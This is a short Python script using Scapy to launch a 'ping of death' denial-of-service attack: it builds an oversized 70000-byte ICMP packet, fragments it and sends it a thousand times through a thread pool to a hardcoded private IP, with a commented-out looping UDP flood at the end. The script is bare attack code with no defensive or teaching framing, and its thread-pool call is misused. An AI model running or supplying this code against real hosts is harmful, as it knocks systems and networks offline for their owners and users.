from tabnanny import verbose
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor
# Change according with your IP addresses
SOURCE_IP="10.0.1.1"
# TARGET_IP="192.168.43.193"
TARGET_IP="192.168.43.17"
MESSAGE="T"
NUMBER_PACKETS=1 # Number of pings
# pingOFDeath = IP(dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
pingOFDeath = IP(dst=TARGET_IP)/ICMP()/(MESSAGE*70000)
# send(NUMBER_PACKETS*pingOFDeath)
executor = ThreadPoolExecutor(10)
for _ in range (1000):
    future = executor.submit(send(fragment(pingOFDeath)), ("Completed"))
    print(future.done())
    
print("All done !")

# #!/usr/bin/env python
# #
# #  Requires:
# #    - scapy
# #    - tcpreplay

# payload = 'a' * 100
# pkt = IP(dst=TARGET_IP)/UDP(dport=[3000])/payload
# send(pkt,loop=1)